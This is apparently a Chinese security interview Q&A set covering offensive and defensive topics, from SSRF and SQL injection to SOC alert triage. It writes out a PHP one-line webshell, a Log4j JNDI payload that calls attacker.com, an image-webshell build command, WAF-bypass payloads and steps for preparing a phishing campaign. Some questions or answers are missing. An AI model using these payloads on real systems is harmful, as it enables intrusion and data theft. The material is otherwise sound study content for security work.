1. JNI 函数在 java 中函数名为 com.didi.security.main，C 中的函数名是什么样的？

JNI 采用固定的命名规则：Java_<包名>_<类名>_<方法名>，包名和类名中的点号均替换为下划线。

  • 若 com.didi.security.main 是全限定类名，且 Java 中声明的 native 方法是 doWork，则 C 函数名为：
    Java_com_didi_security_main_doWork(JNIEnv *env, jobject thiz, ...)
  • 若类名实际上是 Main（大写在规范中可能被写成 main），则前缀变为 Java_com_didi_security_Main_。
    面试时只需说明规则并给出举例即可。

2. Frida 和 Xposed 框架？

两者都是常用的动态 Hook 框架，但实现原理和适用场景不同：

  • Xposed：仅支持 Android，需 Root 权限，通过替换 /system/bin/app_process 修改 Zygote 进程，对每个应用生效。模块用 Java 编写，主要用于 Hook Java 层，且修改后需重启设备生效，稳定性较好，适合长期修改。
  • Frida：跨平台（Android/iOS/Windows/Linux），无需重启，通过注入 JS 脚本实现实时动态插桩。可 Hook Java 层及 Native 层，非常灵活，常用于逆向分析、漏洞验证等场景。缺点是有明显特征，容易被检测。

3. SSRF 利用方式？

SSRF（服务端请求伪造）的核心是让服务器发起非预期的请求，常见利用方式包括：

  • 对内网进行端口扫描、服务探测。
  • 攻击内网未授权服务，如 Redis、MySQL、CouchDB、Memcached 等（常配合 gopher 协议）。
  • 读取本地文件（file:///etc/passwd）。
  • 利用云环境元数据接口获取敏感信息（如 AWS 169.254.169.254）。
  • 配合协议如 dict、ftp、gopher 实现命令执行。

4. 宏病毒？

一种寄生于 Office 文档（Word/Excel 等）或模板的宏中的恶意代码，多使用 VBA 编写。用户打开文档并启用宏后，会自动执行恶意行为，如下载木马、窃取信息、感染其他文档等。典型传播途径是鱼叉邮件附件，是早期 APT 攻击的常见手法。

5. APP 加壳？

指对原始 APK/DEX 文件进行加密保护，外套一层“壳”程序。
运行时壳先启动，解密并动态加载原始代码到内存中执行，目的是对抗静态逆向分析和篡改。常见加固厂商有梆梆、爱加密、360 等。逆向时需要先脱壳。

6. 勒索软件 WannaCry 的特征？蠕虫、僵尸病毒

WannaCry 是一种兼具勒索和蠕虫行为的恶意软件：

  • 传播：利用“永恒之蓝”漏洞（MS17-010）对 445 端口自动扫描感染，具备自主蠕虫式扩散能力。
  • 破坏：加密文件后缀为 .WNCRY，弹窗索要比特币赎金。
  • 性质：它并非传统意义上的僵尸网络（无统一 C2 持久化控制），而是典型的勒索蠕虫，蠕虫特性使其短期内爆发式传播。

7. ARM32 位指令中，返回值和返回地址保存在哪个寄存器中？

  • 返回值：通常保存在 R0 寄存器（32 位值）；若为 64 位返回，则用 R0-R1 组合。
  • 返回地址：保存在链接寄存器 LR（R14）中。函数返回时通过 BX LR 跳转回去。

8. HTTPS 握手过程中用到哪些技术？

主要涉及以下技术和机制：

  • 非对称加密：RSA 或 ECDHE，用于身份认证和密钥协商。
  • 对称加密：AES、ChaCha20 等，握手后用于数据传输。
  • 数字证书（X.509）：基于 PKI 体系，由 CA 签发，用于验证服务器身份。
  • 哈希算法：SHA256 等，用于证书签名及消息完整性验证（HMAC）。
  • 密钥交换：DHE/ECDHE 实现前向安全性。
    概括而言就是“非对称交换密钥，对称加密通信，证书验明正身”。

9. Linux 中 PHP 环境，已知 disable_functions=exec,passthru,popen,proc_open,shell_exec,system，请写出两种有可能实现任意命令执行的方式？

（注意：禁用列表包含 exec,passthru,popen,proc_open,shell_exec,system）
常见绕过方法：

  1. LD_PRELOAD 劫持 + mail/error_log
    使用 putenv("LD_PRELOAD=恶意.so") 后，调用 mail() 或 error_log() 等会启动子进程的函数，触发加载恶意共享库，从而执行系统命令。
  2. 利用 imap_open() 函数漏洞（CVE-2018-19518）
    若 PHP 安装了 IMAP 扩展，可通过特殊的 URI 注入命令，达到绕过 disable_functions 的效果。
    （备选：pcntl_exec 若未被禁用，亦可直接执行命令；或利用 FFI 扩展调用 C 函数。）

10. Android APP 逆向分析步骤一般是怎么样的？

常规流程：

  1. 获取 APK，判断是否加壳，有壳则先脱壳。
  2. 使用 apktool/jadx 反编译资源与 DEX，分析 smali 或 Java 伪代码。
  3. 定位关键代码（加密、签名、协议、鉴权等）。
  4. 动态调试：Frida Hook、Xposed 模块或 IDA 动态调试 so 层。
  5. 网络抓包分析 API 交互与加密参数。
  6. 绕过反调试、代理检测、签名校验后，重打包验证或编写 frida 脚本实现脱机分析。

11. SQL 注入的分类？

  • 按参数类型：数字型、字符型、搜索型。
  • 按攻击手法：联合查询注入、报错注入、布尔盲注、时间盲注、堆叠查询注入。
  • 按位置：GET/POST/Cookie/HTTP头注入等。
  • 其他：二次注入、宽字节注入、Base64 编码注入等。

12. SQL 注入的预防？

  • 首要：使用参数化查询（Prepared Statement），彻底分离代码与数据。
  • 严格白名单输入校验，过滤特殊字符。
  • 数据库权限最小化，禁用高权限存储过程。
  • 屏蔽详细错误回显，自定义统一错误页。
  • 部署 WAF 作为额外防线，使用 ORM 框架降低手写 SQL 的风险。

13. 序列化与反序列化的区别

  • 序列化：将内存对象状态转换为可存储或可传输的格式（字节流/字符串）。
  • 反序列化：将该格式重新恢复为内存对象。
    简单区别：序列化是对象→数据，反序列化是数据→对象。安全上，反序列化常因任意对象的恢复而引发代码执行漏洞。

14. 常见的中间件漏洞？

  • Apache：Struts2 系列 RCE、多后缀解析漏洞、CVE-2017-15715。
  • Nginx：解析漏洞（/1.jpg/1.php）、CRLF 注入、路径穿越。
  • IIS：PUT 漏洞、短文件名猜解、解析漏洞（.asp;.jpg）。
  • Tomcat：弱口令部署 War、Ghostcat（CVE-2020-1938）文件读取/包含。
  • WebLogic：反序列化 RCE、SSRF 漏洞。
  • JBoss：反序列化漏洞、未授权访问后台部署 War。
  • Redis：未授权访问导致写 Webshell、计划任务反弹 shell、SSH key 注入。

15. 内网渗透思路？

常规步骤：

  1. 入口突破后，进行信息收集（IP、域名、域控、存活主机、端口服务）。
  2. 凭证获取：抓内存哈希（mimikatz）、翻文件、凭据窃取。
  3. 横向移动：psexec、WMI、计划任务、哈希传递、票据传递。
  4. 持久化：计划任务、注册表启动、隐蔽隧道（如 frp、EW）维持控制。
  5. 目标达成：定位核心数据、域控权限，后清理痕迹并导出结果。

16. 正向代理和反向代理的区别

  • 正向代理：代理客户端，隐藏客户端身份，帮助客户端访问原本不可达的服务器（例如科学上网）。
  • 反向代理：代理服务端，隐藏后端真实服务器，对外表现为一个统一入口，用于负载均衡、缓存、安全防护（例如 Nginx 反向代理后端的应用集群）。

17. 蚁剑/菜刀/冰蝎的相同与不相同之处

  • 相同：都是 Webshell 管理工具，提供文件管理、命令执行、数据库操作等功能，用于网站后渗透控制。
  • 不同：
    • 菜刀：经典老牌，无流量加密，特征明显，易被 WAF/IDS 拦截。
    • 蚁剑：开源、模块化，支持自定义编码和插件扩展，灵活性高，但仍可被特征识别。
    • 冰蝎：采用动态密钥协商和加密隧道传输流量，隐蔽性强，过 WAF 效果好，是目前较为隐蔽的 Webshell 管理工具。

18. 正向 Shell 和反向 Shell 的区别

  • 正向 Shell：攻击者主动连接目标机器已开放的端口，获取 Shell。需目标开放防火墙入站端口。
  • 反向 Shell：目标机器主动向外连接攻击者监听的端口，反弹一个 Shell。常用于绕过防火墙出站限制和 NAT。
    核心区别在于连接发起方向，反向 Shell 更隐蔽、更常用。

19. Windows 提权以及常用的提权方法

利用系统漏洞或配置不当从低权限提升至 System/管理员。常用方法：

  • 内核漏洞提权（MS16-032、CVE-2020-0796 等）。
  • 服务路径引号缺失、服务权限配置不当（可写服务二进制文件）。
  • AlwaysInstallElevated 注册表策略提权。
  • 计划任务以高权限运行任意脚本。
  • 令牌窃取（土豆系列：JuicyPotato、PrintSpoofer 等）。
  • DLL 劫持（以高权限进程运行时的搜索路径优先级利用）。

19. Linux 提权有哪些方法

  • 内核漏洞提权（DirtyCow、DirtyPipe、PwnKit 等）。
  • SUID 可执行文件提权（如 find、vim 等具有 SUID 位且能被利用）。
  • sudo 配置不当（NOPASSWD 执行任意命令、LD_PRELOAD 环境变量保留）。
  • Cron 计划任务劫持（可写脚本或路径劫持）。
  • Docker 组提权（挂载宿主机根目录逃逸）。
  • 通配符注入（如 tar 参数注入）和环境变量劫持。

20. 数据库有哪些，关系型的和非关系型的分别是哪些

  • 关系型（RDBMS）：MySQL、PostgreSQL、Oracle、SQL Server、SQLite 等，数据以表形式存储，结构化查询。
  • 非关系型（NoSQL）：MongoDB（文档型）、Redis（键值型）、Cassandra（列族）、HBase、Elasticsearch（搜索引擎）、Neo4j（图数据库）等，存储格式灵活，适用大数据与高并发场景。

21. 解释 PHP 反序列化

反序列化是将 serialize() 生成的字符串恢复为 PHP 对象的过程。
若被反序列化的类中存在魔术方法（如 __wakeup、__destruct、__toString、__call 等），攻击者可通过精心构造的序列化数据，控制这些方法执行时的上下文，从而调用危险函数、实现代码执行或文件操作。这通常需要代码中有可利用的类（pop 链），是 PHP 中危害极大的漏洞类型。

22. PHP 代码执行的危险函数以及 PHP 命令执行函数有哪些？

  • 代码执行（将字符串作为代码执行）：
    eval()、assert()（PHP7 起已变化）、preg_replace() 的 /e 修饰符（已废弃）、create_function()（已废弃）、call_user_func() / call_user_func_array()（动态调用函数时存在风险）等。
  • 命令执行（执行系统命令）：
    system()、exec()、passthru()、shell_exec()、反引号 ````、popen()、proc_open()、pcntl_exec() 等。两者常是安全面试中必问的高危函数列表。

23. XSS原理以及它的利用原理

XSS（跨站脚本攻击）是指攻击者将恶意脚本注入到正常网页中，当用户浏览时脚本在浏览器端执行。
利用原理：利用网站对用户输入未做足够过滤或转义，将脚本当作页面内容输出，浏览器解析后执行。攻击者可用它窃取 Cookie、会话劫持、钓鱼、篡改页面、控制用户浏览器等。

24. XSS有哪几种类型及区别

三类：

  • 反射型：恶意脚本在 URL/请求中，服务端直接回显到响应页面，一次性触发（需诱导点击）。
  • 存储型：脚本被存入服务端（数据库、日志等），其他用户访问时持续触发，危害更大。
  • DOM型：纯客户端问题，JS 读取可控输入（如 location.hash）并动态写入页面，未经过服务端。
    区别在于脚本是即时回显、持久存储还是仅客户端执行。

25. 护网期间设备误报如何处理？

  • 快速确认：分析告警日志的关键字段（payload、源/目的IP、时间线），结合业务上下文判断是否为正常业务行为。
  • 特征调优：若确认误报，将特征加入白名单或调整规则阈值，并反馈给监控平台运营人员。
  • 记录上报：按护网流程记录误报事件，后续统一优化策略，避免同类干扰。
  • 紧急情况：先排除是否利用误报绕过，必要时保留日志，交研判组分析。

26. 如何区分扫描流量和手工流量？

  • 扫描流量：请求密集、有规律（如递增端口或目录)、User-Agent 常为扫描器特征、payload 固定、请求无效路径多、时间间隔短。
  • 手工流量：请求间隔随机，路径更贴合业务逻辑，payload 会随响应调整，行为像真人（有浏览/点击顺序），常有错误重试、Referer 连贯等特征。
    可通过流量包的时间分布、URI 熵值、payload 结构等区分。

27. 告警日志分析的思路？

  1. 核实告警：确认设备类型、规则名称、攻击类型。
  2. 提取关键字段：源/目的 IP、时间、请求方法、URI、payload、HTTP状态码、User-Agent。
  3. 还原攻击路径：结合前后日志判断攻击是否成功（是否返回敏感信息、是否上传成功、是否执行命令）。
  4. 影响评估：确定受害资产、数据泄露风险、横向可能。
  5. 处置闭环：封禁IP、修复漏洞、留存证据、调整策略。

28. HTTP状态码200、302、403、404分别表示什么？

  • 200 OK：请求成功，服务器返回正常内容。
  • 302 Found：临时重定向，要求客户端访问新URL。
  • 403 Forbidden：服务器理解请求但拒绝执行，通常因权限不足。
  • 404 Not Found：请求资源不存在。

29. 内网了解吗，讲下黄金票据和白银票据？利用黄金票据前提条件是什么？

  • 黄金票据：伪造 TGT（票据授权票据），攻击者拿到 KRBTGT 账户的哈希后，可生成任意用户的 TGT，从而冒充域内任意用户访问所有服务。
    • 前提条件：
      1. 获取 KRBTGT 账户的密码 Hash（NTLM）。
      2. 知道域名称和域的 SID。
      3. 能访问域控制器或从域控上导出相关数据。
  • 白银票据：伪造特定服务的服务票据（TGS），利用目标服务的机器账户 Hash 伪造针对该服务的访问权限，范围较小但更隐蔽。

30. Java反序列化Struts 2 漏洞原理以及利用方式

Struts2 早期版本默认对 HTTP 请求参数进行了 OGNL 表达式解析，攻击者通过构造特殊的参数名/值，传入恶意 OGNL 表达式，框架在反序列化或解析过程中执行了该表达式，导致任意代码执行。
利用方式：发送精心构造的 HTTP 请求，携带 OGNL payload，利用 ProcessBuilder 或 Runtime.exec 执行系统命令，常通过工具如 Struts2-Scan 或手工构造 exp。

31. 护网期间怎么防范邮件钓鱼？

  • 部署邮件安全网关，过滤恶意附件和链接沙箱检测。
  • 加强员工安全意识培训，识别可疑邮件。
  • 关闭宏执行或对 Office 文档进行扫描。
  • 开启 SPF/DKIM/DMARC 检测，防止伪造域。
  • 护网期间临时收紧邮件策略，对带附件的邮件延迟投递并审查。

32. 如果在实战中遇到了防护，比如sql注入过滤掉了空格怎么办？

可用多种绕过方法：

  • 用 /**/ 注释代替空格，如 select/**/user。
  • 使用括号 ()，如 select(user)from...。
  • 用加号 +（URL编码后为 %2B）或 %0a（换行）、%0d 等空白符替换。
  • 利用反引号或特殊字符，如 select 用 %60 包围。
  • 部分场景可用Tab键（%09）或回车（%0d%0a）绕过。

33. 什么是Tomcat？

Apache Tomcat 是一款开源的轻量级 Java Web 应用服务器，用于运行 Servlet 和 JSP 页面。它既是 Web 服务器，又是 Servlet 容器，常用于部署中小型 Java Web 应用，支持 HTTP/2、WebSocket 等协议。

34. 简单讲解下内存马？

内存马（Memory Shell）是一种无文件 Webshell，直接在内存中注册恶意代码（如 Filter、Servlet、Listener 或 Spring Controller），没有实际文件落地，因此难以通过文件扫描发现。它常利用动态字节码注入，注册到 Web 容器处理链中，实现持久化控制。

35. 内存马排查思路？

  • 对比 Web 容器正常配置，检查新增的 Filter/Servlet/Listener。
  • 使用内存分析工具（如 Arthas、VisualVM）查看 JVM 中已加载的类，发现可疑非业务类。
  • 检查 MBean 注册情况或通过 JMX 查看异常组件。
  • 借助内存马检测工具（如 java-memshell-scanner）自动扫描。
  • 分析请求链路，看是否有未知的拦截器。

36. 你是用什么工具对App进行抓包？

常用 Burp Suite / Charles / Fiddler，配置手机代理并安装 CA 证书；对 HTTPS 做 SSL Pinning 绕过时，借助 Frida 脚本（如 Universal Android SSL Pinning Bypass）或 Xposed 模块（JustTrustMe），再用抓包工具抓取。

37. 针对apache的文件上传，可以使用什么？

  • 利用多后缀解析漏洞，如上传 1.php.xxx，在特殊配置下可能被解析为 PHP。
  • 使用 .htaccess 覆盖解析规则，将普通扩展名映射为可执行脚本。
  • 配合路径绕过，如 file.php%00.jpg（截断）。
  • 利用 PUT 方法任意写文件（需开启并允许）。
  • 通过 Tomcat/AJP 的 CVE-2017-12615 等漏洞实现 JSP 上传。

38. 关于图片马的制作你知道那些方法？

  • 直接拼接：使用 copy /b 1.jpg + 2.php 3.jpg 将 webshell 代码附加到图片尾部。
  • 利用 exiftool 等工具将 webshell 写入图片的 EXIF 注释字段（如 Comment 字段）。
  • 将 PHP 代码隐藏在图片颜色通道或元数据中，并在目标使用文件包含读取时解析。
  • 基于 GD 库重绘后仍保留特殊标记的“免杀图片马”。

39. 蚁剑和冰蝎的区别？

  • 蚁剑：开源，流量无默认加密（可自定义编码），灵活性高，但特征较明显，易被 WAF 识别。
  • 冰蝎：动态密钥协商，双向加密通信，流量完全加密，隐蔽性很强，能绕过多数 WAF。冰蝎的升级版哥斯拉甚至支持更多加密方式和变形。

40. 平常有挖企业 SRC 嘛？可以说说你的资产收集过程嘛？

资产收集步骤：

  1. 确立目标范围，通过主域名反查子域名（DNS 解析、证书透明度、搜索引擎、测绘平台）。
  2. 使用工具如 OneForAll、Subfinder 等进行爆破。
  3. 端口扫描获取存活 IP 及服务（Nmap/Masscan）。
  4. 识别 Web 应用指纹、CMS 及组件版本。
  5. 从 GitHub、云存储（阿里云OSS 遍历）等外部信源查找敏感泄露。
  6. 整理资产，重点关注边缘站点、测试环境和老旧服务。

41. 关于代码审计你知道哪些，说说看？

代码审计是通过阅读源代码发现安全漏洞的过程。
方法：

  • 静态分析：利用工具（Checkmarx、Fortify、SonarQube）自动化扫描，并辅以人工跟进。
  • 黑盒+白盒：先黑盒找功能点，再对可疑输入回溯代码路径。
  • 关注关键功能：身份认证、文件操作、SQL/命令执行、反序列化、加解密、输出函数等。
  • 常用 PHP 审计工具：Seay 源代码审计系统、RIPS；Java 可使用 IDEA 配合 SpotBugs 等。

42. 介绍 Shiro-550 反序列化漏洞。

Apache Shiro ≤1.2.4 的“记住我”功能，将序列化用户信息 AES 加密、Base64 编码后存于 Cookie 的 rememberMe 字段。由于 AES 加密密钥硬编码（kPH+bIxk5D2deZiIxcaaaA==），攻击者可构造恶意序列化对象，加密后放入 Cookie 发送，服务端解密并反序列化时触发漏洞，导致 RCE。即经典的固定密钥反序列化漏洞。

43. 如果网站有CDN，你如何查看他的真实IP地址？

  • 查询历史 DNS 解析记录（如 SecurityTrails、DNSdb）。
  • 邮箱服务器 IP（邮件头源码泄漏真实 IP，如发送注册邮件）。
  • 子域名查找（部分子域可能没套 CDN）。
  • 网站 RRS（区域传送）、SSL 证书搜索（crt.sh）。
  • 通过国外冷门节点访问或 Zmap 全网扫描获取 SSLCert 信息。

44. SQL注入绕WAF，怎么实现？

  • 注释变形：/**/、/*!*/。
  • 大小写/双写绕过：UnIon、selecselectt。
  • 等价替换：&& 代替 and，|| 代替 or，= 用 like/</>。
  • 空白绕过：%0a、%09、括号。
  • 内联版本注释：/*!50000select*/。
  • 参数污染或分块传输（HTTP Chunked）打乱 payload。
  • 利用数据库特性函数如 char()、hex() 拼接。

45. 解释SQL报错盲注，包括相关的常用函数。

报错盲注是通过触发数据库报错，使错误信息携带查询结果数据的注入手法。页面不直接返回数据，但会打印数据库报错内容。
常用函数：

  • MySQL: extractvalue(1, concat(0x7e, user()))、updatexml(1, concat(0x7e, database()), 1)。
  • SQL Server: convert(int, @@version)。
  • Oracle: to_char(dbms_xmlgen.getxml('...')) 等。

46. WAF的分类和原理。

分类：

  • 网络层WAF（NTA型，基于硬件或云，如 CDN 的 WAF）。
  • 应用层WAF（部署在服务器端的软件插件，如 ModSecurity）。
  • 云WAF（通过 DNS 引流，如阿里云WAF、CloudFlare）。
    原理：检测 HTTP/HTTPS 流量，通过正则规则、语义分析、RASP 等识别 SQL 注入、XSS 等攻击，进行拦截或记录。

47. 天眼的一些功能以及常用的检索语法。

天眼是奇安信的态势感知平台。

  • 功能：全流量存储与分析、威胁检测、告警关联、攻击溯源、资产可视化。
  • 常用语法：
    sip:"攻击IP" 源IP查询；
    dip:"目标IP" 目的IP；
    host:"域名" 域查询；
    uri:"/path" URI；
    payload:"关键字" 攻击载荷搜索；
    proto:HTTP 协议过滤；结合时间范围精确溯源。

48. webshell连接工具菜刀的流量特征。

菜刀早期流量未加密，有较明显的特征：

  • POST 请求 body 部分有固定结构，如 z0= 或 z1= 等参数名，内容为 Base64 编码的命令。
  • 请求头 User-Agent 常为 Java/1.8.0 或其它固定值。
  • 存在 eval 特征码或 @ini_set 等 PHP 函数在 payload 中出现。
  • 响应体常带有执行后的明文返回，易被识别。

49. Java反序列化漏洞了解吗？可以讲下你了解哪些吗？

了解。常见 Java 反序列化漏洞：

  • Shiro 550/721：固定密钥或动态密钥的 RememberMe 反序列化。
  • WebLogic 反序列化：T3协议/XMLDecoder 接口未对输入序列化数据过滤。
  • Fastjson：autoType 支持导致远程代码执行（1.2.24 等）。
  • JBoss反序列化：HTTP Invoker 等。
  • Spring Cloud Gateway RCE：某些场景下可导致反序列化。
    漏洞根本原因是应用在反序列化不可信数据时未做类型检查或白名单限制。

50. 解释内存马以及如何进行检测内存马？

内存马是无文件 Webshell，通过动态注册恶意组件到 Web 容器内存中运行。
检测方法：

  • 检查 JVM 中的 Servlet/Filter/Listener 配置，对比安全基线。
  • 使用 Arthas 的 sc 命令查找可疑类。
  • 通过 Java Agent 遍历已加载类，进行字节码扫描。
  • 专用检测工具如 memshell-scanner。
  • 分析进程内存映射异常注入。

51. 如何清除内存马？

  • 找到对应的 Filter/Servlet/Listener 并调用 destroy() 注销，从内存中移除。
  • 若无法直接注销，可通过反射操作容器内部数据结构强制删除。
  • 使用 Java Agent 动态修改字节码阻断恶意逻辑或卸载类。
  • 快速手段：重启 Web 服务会清除，但可能丢失日志证据。

  • 使用 find 命令检查近期修改的文件：find /var/www -name "*.php" -mtime -3。
  • 关键词 grep：grep -r "eval(" /var/www 等寻找危险函数。

54. 解释sqlmap，讲下sqlmap写shell的条件。

sqlmap 是自动化 SQL 注入检测与利用工具。
写 shell 条件：

  • 数据库具有写文件权限（MySQL 的 secure_file_priv 需为空或包含目标路径）。
  • 知道网站绝对路径（通过报错、phpinfo 或字典猜解）。

55. 永恒之蓝漏洞查看日志的特征？

Windows 系统安全日志 7045（服务安装成功）或 7036 事件，记录可疑服务创建；
网络层面，SMBv1 日志中可能存在大量异常请求；
流量中可见 SMB 协议恶意包，包含畸形 FEA list 或 Transaction 数据。
安防设备通常能直接检测 SMB 远程代码执行流量签名。

56. MS17-010是什么漏洞？用了什么协议？

MS17-010 即“永恒之蓝”，是 Windows SMBv1 服务存在的一组远程代码执行漏洞。
利用 SMB（Server Message Block）协议的 v1 版本，通过发送特制数据包造成缓冲区溢出，实现远程代码执行，被 WannaCry 等蠕虫大量利用。

57. 做过免杀吗，现在主要的免杀手段是什么？

有了解。主要免杀手段：

  • 静态免杀：修改源码/字节码混淆、加密 payload、更换函数调用方式、删减特征字符串。
  • 动态免杀：API 动态调用、进程注入（如 Cs 的壳、回调函数执行）、内存加载执行无文件落盘。
  • 行为免杀：降低休眠时间、加入正常操作噪音、更换通信协议（HTTPS、DNS 隧道）。
  • 特定对抗：绕过 AMSI、ETW、CLM 等，如 PowerShell 编码、无 powershell.exe 方式执行。

58. 内网横向有哪些告警类型？

  • 远程服务创建（PsExec、WMI 调用）。
  • 异常登录（非工作时间、陌生IP 登录成功/失败暴破）。
  • 哈希传递攻击（使用 NTLM 认证登录）。
  • Kerberos 票据异常（Golden Ticket、Silver Ticket、Kerberoasting 请求）。
  • 横向移动工具特征（如 Impacket 包流量、SMB/RDP 爆破）。
  • 异常计划任务和注册表 Run 项。

59. 挖矿木马告警怎么判断？

  • 网络层面：连接已知矿池域名/IP，协议特征（Stratum 协议）或特定端口。
  • 主机层面：CPU 飙升，进程名伪装（如 [kworker] 异常位置），计划任务/定时器写入。
  • 文件特征：存在挖矿程序文件（如 xmrig 二进制），隐藏目录。
  • 结合告警日志中的进程行为链：父进程异常、外联地址查询威胁情报。

60. 在椒图平台日志分析中result字段表示得含义是？

（椒图为安全事件分析平台）
result 字段通常表示告警的判定结果或攻击响应状态，比如 success（成功）、failure（失败）、attempt（尝试）、blocked（已拦截）等，用于快速判断攻击是否实际生效。具体含义需参考平台数据字典。

61. 告警分析payload大概在什么位置？

通常在 HTTP 告警的请求体中或 URL 查询参数内。

  • Nginx/Apache 日志的 $request 字段。
  • JSON 日志的 payload、requestBody、queryString 等字段。
  • 全流量设备的 http.content 或 http.request 区域。
    直接搜索 payload: 或查看对应日志的详细输出。

65. 解释分析中心有什么日志？

分析中心（如 SIEM/SOC 平台）通常汇聚：

  • 安全设备日志：IDS/IPS、WAF、防火墙。
  • 主机日志：Windows 事件日志、Linux syslog、EDR 探针日志。
  • 应用日志：Web 访问日志、数据库审计日志。
  • 威胁情报匹配结果、漏洞扫描数据。
  • 流量取证全量/关键会话记录。

66. eval函数在木马中的作用？

eval() 函数将其参数作为代码执行，是一句话木马的“心脏”。
例如 <?php @eval($_POST['pass']);?>，攻击者通过 POST 传递的 pass 参数内容会直接被当作 PHP 代码执行，从而实现对服务器的完全控制。它是将动态数据转为代码执行的最直接桥梁。

67. 如何确定web攻击是真实攻击还是误报攻击，从多角度回答并举例说明。

  • 攻击结果判断：检查响应状态码和返回内容。例如，SQL 注入返回了数据库错误或数据，上传攻击返回了文件路径或成功状态，则很大可能是真实攻击。若返回业务正常错误则可能误报。
  • 上下文分析：分析前后请求序列，真实攻击往往有探测→利用→payload 递进的模式；误报可能是随机扫描或正常业务参数触发。例如参数 ?id=1' or '1'='1 是典型注入试探，而 ?id=John's 可能是正常英文名字。
  • 威胁情报关联：源 IP 是否有恶意标签、是否对多个目标发起相同攻击。
  • 资产脆弱性验证：确认目标应用版本是否确实存在该漏洞，若不存在则显然误报。
  • 人工复现：在测试环境发送相同请求，观察效果；无法复现或不合逻辑的告警多为误报。

  • 微步在线（ThreatBook）
  • 奇安信威胁情报中心
  • 绿盟威胁情报中心
  • 阿里云威胁情报
  • VirusTotal
  • IBM X-Force Exchange
  • AlienVault OTX
  • Shodan / FOFA / ZoomEye 也可辅助情报收集
    这些平台可查 IP/域名/文件 Hash 的恶意标签、关联样本、历史解析等信息。

69. 木马驻留系统的方式有哪些？

  • 注册为系统服务或计划任务
  • 写入注册表自启动项（Run、RunOnce 等）
  • 植入启动文件夹（Startup 目录）
  • 劫持 DLL（通过 DLL 劫持/侧加载）
  • 替换/感染系统文件或合法程序
  • WMI 事件订阅持久化
  • 内核驱动 Rootkit
  • 修改启动引导（Bootkit）
  • 绑定到常用进程（进程注入/劫持）

70. 当收到钓鱼邮件的时候，说说处理思路。

  1. 隔离：立即切断该邮件进一步传播，通知相关人员勿点击。
  2. 取证：保留原始邮件（含头部信息），记录发件人、时间、主题、附件、链接。
  3. 分析：
    • 检查发件 IP、SPF/DKIM/DMARC 验证结果。
    • 对附件进行沙箱分析（如微步、AnyRun）。
    • 对链接进行展开分析。
  4. 排查：检查是否有用户已点击/执行，查看终端日志、流量日志，查找失陷迹象。
  5. 清除：若发现恶意程序，端点清除并修改密码；若输入了凭证，强制改密。
  6. 加固：根据攻击手法调整邮件网关策略，加强员工教育，输出事件报告。

71. 如何快速检测定位网站目录下的webshell？

  • 使用专业扫描工具（如 D盾、河马查杀、Webshell Scanner）对 Web 目录静态扫描。
  • find 查找近期修改文件：find /var/www -type f -mtime -3。
  • grep 搜索危险函数：grep -rn "eval(" /var/www --include="*.php"、base64_decode 等。
  • 检查异常文件：文件名随机、非业务扩展名（.php.jpg）、隐藏文件。
  • 分析 Web 日志，定位攻击时间点上传的路径。
  • 结合文件完整性校验（如 Tripwire）对比变化。

72. 告警日志分析的思路。

（同 27 题）

  1. 核实告警级别和攻击类型。
  2. 提取源/目 IP、时间、请求方法、URI、payload、状态码等关键字段。
  3. 还原攻击上下文：是扫描试探还是成功利用？查看响应内容是否返回敏感数据或回显。
  4. 横向关联前后日志，判断攻击是否深入。
  5. 评估影响范围，确定受害资产。
  6. 处置（封禁、修复、留存证据）并优化告警规则。

73. 描述外网打点的流程。

  1. 资产收集：子域名挖掘、DNS 历史、证书透明度、FOFA/Shodan 搜索，获取 IP 和 Web 资产。
  2. 端口扫描：Nmap/Masscan 快速识别开放端口及对应服务。
  3. 指纹识别：识别 CMS、中间件、开发框架及版本号（whatweb、Wappalyzer）。
  4. 漏洞探测：针对已知框架/组件（如 Struts2、Shiro、Fastjson）使用专用 POC 扫描，弱口令暴破常见服务。
  5. 漏洞利用：找到突破口后获取初步权限（Webshell 或命令执行）。
  6. 后渗透：提权、内网穿透、凭据收集。
    流程核心是快速收敛攻击面，优先打击可直接 RCE 的漏洞。

74. 举几个 FOFA 在外网打点过程中的使用小技巧。

  • domain="example.com" 直接搜索关联主域名，快速发现子域及公网资产。
  • cert="example.com" 通过 SSL 证书关联，找到 CDN 背后的真实 IP。
  • body="关键字" 搜索特定 CMS 或应用特征（如后台登录页面）。
  • title="管理平台" 找暴露的管理入口。
  • port="8080" && protocol="http" 结合服务搜索非标准端口 Web 服务。
  • ip="x.x.x.x/24" 扫描整个 C 段资产，寻找边界薄弱点。
  • 使用 after="2024-01-01" 限定存活资产，减少死链。

75. 解释 CDN 并说明如何识别 CDN。

CDN（内容分发网络）通过分散节点缓存内容，隐藏源站真实 IP。
识别方法：

  • 多地 ping（使用在线工具 ping 多个地区），若返回不同 IP 多为 CDN。
  • 查询 DNS 记录的 CNAME，指向 CDN 厂商域名（如 xx.cloudflare.com）。
  • HTTP 响应头中可能有 X-Cache、Via、CDN 特征字段。
  • 使用 CDN 检测网站或工具（如 ipip.net）。

76. 邮件钓鱼的准备工作有哪些？

  • 目标信息收集：组织架构、人员邮箱、近期活动、相关业务。
  • 发件域名准备：注册相似域名（typosquatting）或利用可伪域的邮件服务。
  • 邮件服务器搭建：配置 SPF、DKIM 尽可能绕过检测。
  • 攻击载体制作：恶意附件（宏、漏洞文档）、钓鱼页面（仿冒登录），并设置恶意链接或木马。
  • 邮件内容编写：贴合目标场景，设计诱人主题（紧急通知、工资条等）。
  • 反检测准备：混淆附件、链接重定向、绕过沙箱。
  • 目标列表清洗和测试发送。

77. 判断出靶标的 CMS，对外网打点有什么意义？

  • 缩小攻击面，直接匹配该 CMS 已知漏洞（公开 EXP）。
  • 快速定位后台地址、默认配置和弱口令。
  • 了解插件/模块组成，寻找第三方插件漏洞。
  • 节省盲扫时间，提高打点效率，隐藏扫描行为。
  • 可针对该 CMS 特定利用方法（如文件上传、SQL注入）进行定制。

78. Apache Log4j2 的漏洞原理是什么？

Log4j2 的 JNDI 注入漏洞（CVE-2021-44228）。Log4j2 在记录日志时会对日志内容中的 ${...} 进行查找和解析。若日志中包含 ${jndi:ldap://attacker.com/a}，Log4j2 会通过 JNDI 请求该 LDAP 地址，加载远程恶意类并执行，导致 RCE。根本原因是未对消息中的 lookup 功能进行安全限制。

79. 水坑攻击和鱼叉攻击的区别是什么？

  • 鱼叉攻击：定向钓鱼，针对特定个人或组织，发送高度伪装的恶意邮件，诱使其点击。
  • 水坑攻击：攻击者入侵目标群体常访问的合法网站，植入恶意代码，等待目标访问时被感染。
    区别在于：鱼叉是主动“送上门”，水坑是“守株待兔”。

80. 如何判断靶标站点是 Windows/Linux？

